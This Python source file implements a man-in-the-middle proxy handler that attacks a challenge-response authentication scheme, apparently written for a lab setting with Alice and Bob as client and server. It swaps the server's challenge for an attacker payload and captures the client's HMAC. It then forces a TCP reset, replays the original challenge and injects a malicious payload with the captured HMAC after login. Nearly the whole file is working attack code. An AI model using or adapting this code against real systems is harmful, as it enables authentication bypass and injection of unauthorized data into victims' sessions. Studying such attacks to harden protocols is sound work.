import binascii
import asyncio
import socket
import struct
import logging

class MitmGlobalState:
    """Global state manager for MITM attacks across connections"""
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.state = {
                'active': False,
                'stored_challenge': None,
                'stored_hmac': None,
                'injected': False,
                'phase': None,
                'original_challenge': None,
                'original_hmac': None,
                'replay_ready': False,
                'connection_count': 0,
                'message_count': 0
            }
        return cls._instance
    
    def reset_state(self):
        """Reset the global state for a new attack cycle"""
        self.state = {
            'active': False,
            'stored_challenge': None,
            'stored_hmac': None,
            'injected': False,
            'phase': None,
            'original_challenge': None,
            'original_hmac': None,
            'replay_ready': False,
            'connection_count': 0,
            'message_count': 0
        }

class MitmAttackHandler:
    def __init__(self, direction_name, payload_handler):
        self.direction_name = direction_name
        self.payload_handler = payload_handler
        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
        self.attack_log = payload_handler.should_log_attack(direction_name)
        self.global_state = MitmGlobalState()
        if self.attack_enabled and self.attack_log:
            logging.info(f"[MITM] Attack mode enabled for direction {direction_name}")

    def force_tcp_rst(self, writer):
        """Force a TCP RST by setting SO_LINGER to 0 and closing the socket"""
        try:
            sock = writer.get_extra_info('socket')
            if sock:
                # Set SO_LINGER to 0 to force RST instead of FIN
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                if self.attack_log:
                    logging.info(f"[MITM] Forcing TCP RST by setting SO_LINGER to 0")
        except Exception as e:
            if self.attack_log:
                logging.error(f"[MITM] Error setting SO_LINGER: {e}")

    def force_tcp_rst_connection(self, writer):
        """Force a TCP RST by closing the connection abruptly"""
        try:
            if self.attack_log:
                logging.info(f"[MITM] Forcing TCP RST by closing connection abruptly")
            
            # Get the underlying socket
            sock = writer.get_extra_info('socket')
            if sock:
                # Set SO_LINGER to 0 to force RST
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            
            # Close the writer immediately without waiting
            writer.close()
            
        except Exception as e:
            if self.attack_log:
                logging.error(f"[MITM] Error forcing TCP RST: {e}")
            # Fallback: just close normally
            try:
                writer.close()
            except:
                pass

    def hex_dump(self, data, max_len=100):
        """Create a hex dump of data for debugging"""
        if isinstance(data, str):
            data = data.encode('utf-8', errors='replace')
        hex_str = data[:max_len].hex()
        if len(data) > max_len:
            hex_str += "..."
        return hex_str

    async def process_message(self, raw_msg, original_data, writer):
        should_forward = True
        if not self.attack_enabled:
            return should_forward
            
        self.global_state.state['message_count'] += 1
        
        # Enhanced logging for debugging
        if self.attack_log:
            logging.info(f"[MITM] Message #{self.global_state.state['message_count']}:")
            logging.info(f"  Type: {type(raw_msg)}")
            logging.info(f"  Content: {str(raw_msg)[:200]}")
            logging.info(f"  Raw data hex: {self.hex_dump(original_data)}")
            logging.info(f"  State: {self.global_state.state['phase']}")
            logging.info(f"  Active: {self.global_state.state['active']}")
            
        # Detect challenge from server (Bob) - try multiple formats
        challenge_detected = False
        if isinstance(raw_msg, str):
            if raw_msg.startswith('#CHALLENGE#'):
                challenge_detected = True
            elif '#CHALLENGE#' in raw_msg:
                challenge_detected = True
        elif isinstance(raw_msg, bytes):
            if b'#CHALLENGE#' in raw_msg:
                challenge_detected = True
        elif isinstance(raw_msg, dict):
            # Check if it's a challenge message in dict format
            if 'action' in raw_msg and raw_msg['action'] == 'challenge':
                challenge_detected = True
            elif 'type' in raw_msg and raw_msg['type'] == 'challenge':
                challenge_detected = True
                
        if challenge_detected:
            if not self.global_state.state['active']:
                self.global_state.state['active'] = True
                self.global_state.state['phase'] = 'waiting_hmac'
                self.global_state.state['original_challenge'] = original_data
                self.global_state.state['connection_count'] += 1
                if self.attack_log:
                    logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
                    logging.info(f"[MITM] Challenge content: {raw_msg}")
                    logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
                
                # Instead of forwarding Bob's challenge, send our own malicious challenge
                malicious_bytes = b''
                if self.attack_payload_hex:
                    try:
                        # Ensure hex string has even length
                        hex_str = self.attack_payload_hex.strip()
                        if len(hex_str) % 2 != 0:
                            hex_str = hex_str + '0'  # Pad with zero if odd length
                        malicious_bytes = binascii.unhexlify(hex_str)
                        if self.attack_log:
                            logging.info(f"[MITM] Sending malicious payload: {self.hex_dump(malicious_bytes)}")
                    except Exception as e:
                        logging.error(f"[MITM] Error decoding malicious payload: {e}")
                        logging.error(f"[MITM] Hex string was: {self.attack_payload_hex}")
                        malicious_bytes = b''
                else:
                    if self.attack_log:
                        logging.warning("[MITM] No malicious payload configured, sending empty payload")
                
                # Send the malicious challenge to Alice
                writer.write(malicious_bytes)
                await writer.drain()
                if self.attack_log:
                    logging.info(f"[MITM] *** Sent malicious challenge to client ***")
                return False
                
        # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
        elif (self.global_state.state['active'] and 
              self.global_state.state['phase'] == 'waiting_hmac' and 
              isinstance(raw_msg, (bytes, str))):
            # Check if this looks like an HMAC response (not a challenge or welcome)
            if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
                self.global_state.state['stored_hmac'] = original_data
                self.global_state.state['phase'] = 'waiting_reconnect'
                if self.attack_log:
                    logging.info(f"[MITM] *** HMAC DETECTED from client ***")
                    logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
                    logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
                    logging.info(f"[MITM] Forcing TCP RST.")
                
                # Signal that we need to reset the connection
                # Return a special value to indicate RST needed
                return "RST_CONNECTION"
                
        # After reconnect, replay original challenge
        elif (self.global_state.state['active'] and 
              self.global_state.state['phase'] == 'waiting_reconnect' and 
              self.global_state.state['original_challenge']):
            if self.attack_log:
                logging.info(f"[MITM] *** Replaying original challenge after reconnect ***")
            writer.write(self.global_state.state['original_challenge'])
            await writer.drain()
            self.global_state.state['phase'] = 'waiting_welcome'
            if self.attack_log:
                logging.info(f"[MITM] Replayed original challenge to client after reconnect.")
            return False
            
        # After handshake, inject malicious payload with captured HMAC
        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_welcome':
            welcome_detected = False
            if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                welcome_detected = True
            elif isinstance(raw_msg, dict):
                if 'action' in raw_msg and raw_msg['action'] == 'welcome':
                    welcome_detected = True
                elif 'type' in raw_msg and raw_msg['type'] == 'welcome':
                    welcome_detected = True
                    
            if welcome_detected:
                if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
                    if self.attack_log:
                        logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                    
                    # Craft the malicious package: malicious payload + captured HMAC
                    malicious_package = b''
                    if self.attack_payload_hex:
                        try:
                            hex_str = self.attack_payload_hex.strip()
                            if len(hex_str) % 2 != 0:
                                hex_str = hex_str + '0'
                            malicious_payload = binascii.unhexlify(hex_str)
                            malicious_package = malicious_payload + self.global_state.state['stored_hmac']
                        except Exception as e:
                            logging.error(f"[MITM] Error crafting malicious package: {e}")
                            malicious_package = self.global_state.state['stored_hmac']
                    else:
                        malicious_package = self.global_state.state['stored_hmac']
                    
                    writer.write(malicious_package)
                    await writer.drain()
                    if self.attack_log:
                        logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
                    self.global_state.state['injected'] = True
                return True
            
        # If we're in attack mode but haven't seen a challenge yet, just forward normally
        elif self.global_state.state['active'] and self.global_state.state['phase'] is None:
            if self.attack_log:
                logging.info(f"[MITM] Waiting for challenge, forwarding message normally.")
            return True
            
        return should_forward 